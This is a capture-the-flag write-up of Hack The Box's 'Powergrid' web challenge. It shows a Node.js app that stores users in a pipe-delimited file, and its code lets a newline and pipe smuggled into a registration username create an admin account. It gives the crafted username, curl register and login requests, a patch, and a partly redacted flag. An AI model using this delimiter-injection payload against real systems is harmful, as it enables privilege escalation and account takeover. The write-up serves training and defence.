<div align="center">

# Powergrid — HackTheBox

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge)
![Category](https://img.shields.io/badge/Category-Web-blue?style=for-the-badge)
![Status](https://img.shields.io/badge/Status-Solved-success?style=for-the-badge)

<img src="../../assets/MrsNobody.png" width="200" alt="MrsNobody">

**MrsNobody**

---

</div>

> **Disclaimer:** This writeup is for educational purposes only, performed in an authorized Hack The Box environment.

## Challenge Information

| Property | Value |
|----------|-------|
| Challenge | Powergrid |
| Category | Web |
| Difficulty | Easy |
| Points | 20 |
| Creator | lordrukie |
| Vulnerability | CRLF / Delimiter Injection in Flat-File Database |

---

## Table of Contents

1. [Scenario](#scenario)
2. [Reconnaissance](#reconnaissance)
3. [Source Code Analysis](#source-code-analysis)
4. [Understanding the Vulnerability](#understanding-the-vulnerability)
5. [How the Exploit Works](#how-the-exploit-works)
6. [Patching the Vulnerability](#patching-the-vulnerability)
7. [Flag](#flag)
8. [Key Takeaways](#key-takeaways)

---

## Scenario

> Blackouts spread under the NecroNet's command, and in the flicker of dying transformers, the white-hats race to reboot the power grid before darkness becomes permanent.

---

## Reconnaissance

The target hosts an **HTB Editor** — a code editor containing a Node.js power grid management application. The app stores users in a **flat text file** (`users.txt`) using pipe-delimited format.

### Directory Structure

```bash
curl -s http://<CHALLENGE_IP>:<PORT>/api/directory | python3 -m json.tool
```

Key files: `utils/db.js` (user storage), `routes/auth.js` (login/register), `users.txt` (user database), `exploit/solver.py`

---

## Source Code Analysis

### User Storage Format (users.txt)

Users are stored as pipe-delimited lines:

```
admin|a8f5f167f44f4964e6c998dee827110c|admin
operator1|b2ef4c5e5f5c4e8eb31e....|operator
```

Format: `username|sha256_password_hash|role`

### User Registration (utils/db.js)

```javascript
export function addUser(username, password, role = 'operator') {
    const users = readUsers();

    // Check if username already exists
    if (users.find(user => user.username === username)) {
        return false;
    }

    const newUser = {
        username,                       // <-- NO SANITIZATION!
        password: hashPassword(password),
        role
    };

    users.push(newUser);
    return writeUsers(users);
}
```

### File Writing (utils/db.js)

```javascript
export function writeUsers(users) {
    const data = users.map(user =>
        `${user.username}|${user.password}|${user.role}`
    ).join('\n');

    fs.writeFileSync(USERS_FILE, data + '\n', 'utf8');
    return true;
}
```

### File Reading (utils/db.js)

```javascript
export function readUsers() {
    const data = fs.readFileSync(USERS_FILE, 'utf8');
    const lines = data.trim().split('\n').filter(line => line.trim());

    const users = [];
    for (const line of lines) {
        const parts = line.split('|');
        if (parts.length !== 3) continue;
        const [username, password, role] = parts;
        users.push({ username: username.trim(), password: password.trim(), role: role.trim() });
    }
    return users;
}
```

---

## Understanding the Vulnerability

The `addUser` function does **not sanitize the username** for pipe (`|`) or newline (`\n`) characters. Since users are stored in a pipe-delimited text file with one user per line, an attacker can inject these delimiters to:

1. **Inject a pipe `|`** to control the password hash and role fields
2. **Inject a newline `\n`** to create a second user entry

This is a **CRLF/Delimiter Injection** attack targeting a flat-file database.

---

## How the Exploit Works

### Step 1: Pre-compute a Password Hash

The attacker chooses a known password and computes its SHA256 hash:

```python
import hashlib
password = "CoolPassword17!"
hash = hashlib.sha256(password.encode()).hexdigest()
# Result: 4befd7f713861d52cb520dcf4b5b262b11a306fbd19a76563fa36b07e99a7aef
```

### Step 2: Craft a Malicious Username

```python
username = "hacker|4befd7f713861d52cb520dcf4b5b262b11a306fbd19a76563fa36b07e99a7aef|admin\nhacker"
```

### Step 3: Register with the Payload

```bash
curl -s -X POST "http://<CHALLENGE_IP>:<PORT>/challenge/api/auth/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker|4befd7f...7aef|admin\nhacker","password":"CoolPassword17!"}'
```

### What Happens in users.txt

The `writeUsers` function produces this line:

```
hacker|4befd7f...7aef|admin
hacker|<actual_hash_of_CoolPassword17!>|operator
```

The newline in the username splits the entry into **two lines**. The first line creates an admin user `hacker` with the pre-computed password hash.

### Step 4: Login as Admin

```bash
curl -s -X POST "http://<CHALLENGE_IP>:<PORT>/challenge/api/auth/login" \
  -H "Content-Type: application/json" \
  -c cookies.txt \
  -d '{"username":"hacker","password":"CoolPassword17!"}'
```

The `readUsers` function reads line 1 first, finds `hacker` with role `admin`, and the pre-computed hash matches the password. Admin access granted.

---

## Patching the Vulnerability

### The Fix

Add input validation to `addUser` in `utils/db.js` to reject usernames containing delimiters:

**Before (vulnerable):**

```javascript
export function addUser(username, password, role = 'operator') {
    const users = readUsers();

    if (users.find(user => user.username === username)) {
        return false;
    }
    // ... creates user with unsanitized username
```

**After (patched):**

```javascript
export function addUser(username, password, role = 'operator') {
    const users = readUsers();

    // Validate username - prevent delimiter injection
    if (username.includes('|') || username.includes('\n') || username.includes('\r') || /[\n\r]/.test(username)) {
        return false;
    }

    if (users.find(user => user.username === username)) {
        return false;
    }
    // ... rest unchanged
```

### Apply the Patch

```bash
# Save patched file
curl -s -X POST "http://<CHALLENGE_IP>:<PORT>/api/save" \
  -H "Content-Type: application/json" \
  -d '{"path":"utils/db.js","content":"<PATCHED_CONTENT>"}'

# Restart and verify
curl -s -X POST "http://<CHALLENGE_IP>:<PORT>/api/restart"
curl -s "http://<CHALLENGE_IP>:<PORT>/api/verify"
```

```json
{"flag": "HTB{l3g4cy_db_w1th_crlf_████████████████████████}"}
```

---

## Flag

| Flag | Value |
|------|-------|
| Challenge | `HTB{l3g4cy_db_w1th_crlf_████████████████████████}` |

---

## Key Takeaways

- **Flat-file databases** using delimited formats are inherently dangerous if input is not sanitized — any delimiter character in user input breaks the data structure
- **CRLF injection** isn't just for HTTP headers — it applies to any line-based storage format
- Always validate and sanitize user input at the boundary where it enters the system, not just at display time
- The real-world lesson: avoid flat-file databases for security-sensitive data; use proper databases (SQLite, PostgreSQL) with parameterized queries instead
- Even with proper databases, **always validate input** — reject characters that have no legitimate reason to exist in a username (`|`, `\n`, `\r`, null bytes)

---

<div align="center">

**Written by MrsNobody**

<img src="../../assets/MrsNobody.png" width="80">

*Hack The Box — Powergrid*

</div>

<!-- HTB Powergrid Search Keywords -->
<!-- powergrid hackthebox, powergrid htb, powergrid htb writeup, powergrid htb walkthrough -->
<!-- crlf injection flat file, delimiter injection, pipe injection, newline injection username -->
<!-- flat file database vulnerability, users.txt injection, role escalation via username -->
<!-- htb easy web challenge, hackthebox easy challenge, htb challenge writeup lordrukie -->
